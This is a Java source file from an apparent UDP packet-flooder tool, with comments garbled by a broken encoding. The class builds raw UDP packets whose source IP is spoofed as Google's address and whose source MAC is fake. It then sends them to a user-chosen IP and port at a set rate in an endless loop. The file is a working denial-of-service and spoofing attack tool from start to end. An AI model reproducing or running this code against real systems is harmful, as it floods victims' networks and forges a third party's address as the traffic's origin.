package PacketFlooder;

import java.io.IOException;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.HashMap;

import PF_GUI.PF_GUI_NICList;
import PF_GUI.PF_GUI_Resource;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.UDPPacket;

/**
 * 
 * @author Myeong-Un Ryu
 * @version 1.0.0
 * @since 16.11.26
 * UDP Flooder�� ���� ������ ���� ��Ŷ�� �����ϴ� Ŭ����
 * 
 */

public class PF_SendUDP implements Runnable {

	/** NIC **/
	private jpcap.NetworkInterface m_dev;
	
	/** �߽���(������) IP Address **/
	private InetAddress m_src_ip;
	
	/** �߽���(������) MAC Address **/
	private byte[] m_src_mac;
	
	/** UDP Flooding�� ���� ������ �߽���(������) IP Address **/
	private InetAddress m_attack_src_ip;
	
	/** UDP Flooding�� ���� ������ �߽���(������)  MAC Address **/
	private byte[] m_attack_src_mac;
	
	/** UDP Flooding�� ���� ������ �߽���(������) Source port number **/
	private int m_src_port;


	/** UDP Flooding�� ���� Data �� ���� **/
	private byte[] m_data;
	
	
	/** ������(������) IP Address **/
	private InetAddress m_des_ip;
	
	/** ������(������) MAC Address **/
	private byte[] m_des_mac;
	
	/** ������(������) Port number **/
	private int m_des_port;
	
	
	
	/** �ʴ� ������ ��Ŷ�� �� **/
	public int m_pktsNum;
	
	/** ���� ���� ��Ŷ�� �� **/
	public int m_pktsCount;
	
	/** ��Ŷ ������ ���ӵ� �ð� **/
	private int m_seconds;
	
	/** �ʴ� �ݺ��� ���� �ð� ���� ���� **/
	private long m_sysNanoTime_start;
	
	
	/**
	 * UDP Flooder�� ������ �����ϴ� �޼ҵ� ������ ����̽��� ���� ��쿡�� true�� ����
	 * @return boolean BOOLEANŸŸ������ ���� 
	 * @throws UnknownHostException 
	 * @throws NumberFormatException 
	 * @throws SocketException
	 * @param ip ������(������) IP Address
	 * @param port ������(������) Port Number
	 * @param speed �ʴ� ������ ��Ŷ�� ��
	 */
	public boolean set_PF_SendUDP(String ip, String port, int speed) throws NumberFormatException, UnknownHostException, SocketException 
	{
		
		// Device�� �̸��� ��������
		HashMap<String, NetworkInterface> imsi_map = PF_GUI_NICList.get_PF_GUI_NICList_Instance().m_Map_Device;

		// ���õ� Device�� NPF ������ �������� Device�� �̸����� map���� ã�ƿ´�.
		m_dev = imsi_map.get(PF_GUI_NICList.get_PF_GUI_NICList_Instance().getSelectedValue());
		
		
		if(m_dev!=null) // ������ ����̽��� ���� ��츸 ���� 
		{
			
			// �߽���(������) IP Address ����
			m_src_ip = InetAddress.getLocalHost();

			System.out.println(m_src_ip);
			// �߽���(������) MAC Address
			m_src_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// UDP Flooding�� ���� ������ �߽���(������) IP Address
			m_attack_src_ip = InetAddress.getByName("www.google.com");
			
			// UDP Flooding�� ���� ������ �߽���(������)  MAC Address
			m_attack_src_mac = new byte[]{(byte)0,(byte)1,(byte)2,(byte)3,(byte)4,(byte)5};
			
			// UDP Flooding�� ���� ������ �߽���(������) Source port number
			m_src_port = 12;

			// UDP Flooding�� ���� Data �� ����
			m_data = ("myeonguni.com").getBytes();
			
			
			// ������(������) IP Address
			String[] ipArray = ip.split("\\.");
			m_des_ip = InetAddress.getByAddress(new byte[]{(byte)Integer.parseInt(ipArray[0]),(byte)Integer.parseInt(ipArray[1]),(byte)Integer.parseInt(ipArray[2]),(byte)Integer.parseInt(ipArray[3])});
			
			// ������(������) MAC Address
			// m_des_ip�� ��ȿ�� ���� �ƴ� ��쿡 ���� ����ó���� �ؾ��� ���� ������ ��, �ϴ��� m_src_ip�� ��ü
			m_des_mac = java.net.NetworkInterface.getByInetAddress(m_src_ip).getHardwareAddress();
			
			// ������(������) Port number
			m_des_port = Integer.parseInt(port);
			
			
			// �ʴ� ������ ��Ŷ�� ���� ����
			m_pktsNum = speed;
			
			
			return true;
		}
		else // ������ ����̽��� ���ٸ� false�� �����Ѵ�.
		{
			return false;
		}

	}// method end
	
	
	/**
	 * �����带 �̿��Ͽ� UDP Packet�� �����Ͽ� �����ϴ� �޼ҵ�
	 */
	@Override
	public void run() {
		
		// ��Ŷ ���� ��ü ����
		JpcapSender sender = null;
		try {
			sender = JpcapSender.openDevice(m_dev);
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		/*
		 * 
		 * UDP Packet ���� �� UDP header ���� 
		 * 1) src_port	- Source port number
		 * 2) dst_port	- Destination port number
		 * 
		 */
		UDPPacket packet = new UDPPacket(m_src_port,m_des_port);
		
		
		/*
		 * 
		 * IP header ����
		 * 1) d_flag	- IP flag bit: [D]elay,
		 * 2) t_flag	- IP flag bit: [T]hrough,
		 * 3) r_flag	- IP flag bit: [R]eliability,
		 * 4) rsv_tos	- Type of Service (TOS),
		 * 5) priority	- Priority,
		 * 6) rsv_frag	- Fragmentation Reservation flag,
		 * 7) dont_frag	- Don't fragment flag,
		 * 8) more_frag	- More fragment flag,
		 * 9) offset	- Offset,
		 * 10) ident	- Identifier,
		 * 11) ttl		- Time To Live,
		 * 12) protocol	- Protocol,
		 * 13) src		- Source IP address,
		 * 14) dst		- Destination IP address
		 * 
		 */
		packet.setIPv4Parameter(0,false,false,false,0,false,false,false,0,1010101,100,IPPacket.IPPROTO_UDP,
				m_attack_src_ip,m_des_ip);
		
		
		/*
		 * Payload ����
		 */
		packet.data = m_data;
		
		
		/*
		 * Ethernet header ����
		 */
		EthernetPacket ether = new EthernetPacket();
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		ether.src_mac = m_attack_src_mac;
		ether.dst_mac = m_des_mac;
		packet.datalink = ether;

		
		// ���ۿ� ������ ���� ��Ŷ �� �ʱ�ȭ
		m_pktsCount = 0;
		
		// ���� ���� �ð� �ʱ�ȭ
		m_seconds = 0;

		// ���� ���� �ð� �ʱ�ȭ ���� ���÷��� ����
		PF_GUI_Resource.get_Instance().m_lbl_elapsedSeconds.setText(String.valueOf(m_seconds));
		
		
		/*
		 * �ʴ� ����ڰ� ������ ����ŭ ��Ŷ�� ������ �ϴ� ���ѷ���
		 */
		while (true) {

			// �ð� ���� ����
			m_sysNanoTime_start = System.nanoTime();
		
			/*
			 * ��Ŷ�� �����ϴ� loop
			 */
			for(int i=0; i<m_pktsNum; i++)
			{
				// ��Ŷ ����
				sender.sendPacket(packet);
				
				// ���ۿ� ������ ���� ��Ŷ �� �ǽð� ���
				PF_GUI_Resource.get_Instance().m_lbl_sendPackets.setText(String.valueOf(++m_pktsCount));
	
				// Stop ��ư�� Ŭ���Ͽ� interrupt �޼ҵ带 ȣ���Ͽ��� ���
				if (Thread.currentThread().isInterrupted()) {
					// ��Ŷ ���� loop�� ������
					break;
				}
			}
			
			// Stop ��ư�� Ŭ���Ͽ� interrupt �޼ҵ带 ȣ���Ͽ��� ���
			if (Thread.currentThread().isInterrupted()) {
				// �ʸ� üũ�ϴ� ���� loop�� ������
				break;
			}

			/*
			 * �ð� ���� ���� 1�ʰ� ������ �ʾ��� ��� 1�ʰ� ���������� üũ�ϴ� ���ѷ���
			 */
			while (((System.nanoTime() - m_sysNanoTime_start) / 1000000000.0) <= 1) {
				// ���� ���ۺ��� ������� �ɸ� �ð�
				System.out.println(((System.nanoTime() - m_sysNanoTime_start) / 1000000000.0));
			}
			
			// ���� ���� �ð��� �ǽð����� ���÷��� ����
			PF_GUI_Resource.get_Instance().m_lbl_elapsedSeconds.setText(String.valueOf(++m_seconds));
					
		}
		
		// ��Ŷ ������ �Ϸ�� ��� - ���� ��ư Ȱ��ȭ : ���� ��ư ��Ȱ��ȭ
		PF_GUI_Resource.get_Instance().m_btn_flooder_Start.setEnabled(true);
		PF_GUI_Resource.get_Instance().m_btn_flooder_Stop.setEnabled(false);
	
	}


}//class end 